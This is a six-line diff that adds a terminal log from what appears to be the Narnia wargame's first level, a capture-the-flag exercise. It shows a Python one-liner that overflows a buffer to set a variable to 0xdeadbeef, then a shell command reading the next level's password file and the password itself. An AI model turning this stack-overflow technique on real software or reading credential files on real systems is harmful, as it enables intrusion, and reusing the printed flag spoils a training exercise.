@@ -1,0 +1,6 @@
+narnia0@narnia:/narnia$ (python -c "print 'B'*20 + '\xef\xbe\xad\xde'"; cat -) | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ▒
+val: 0xdeadbeef
+cat /etc/narnia_pass/narnia1
+efeidiedae
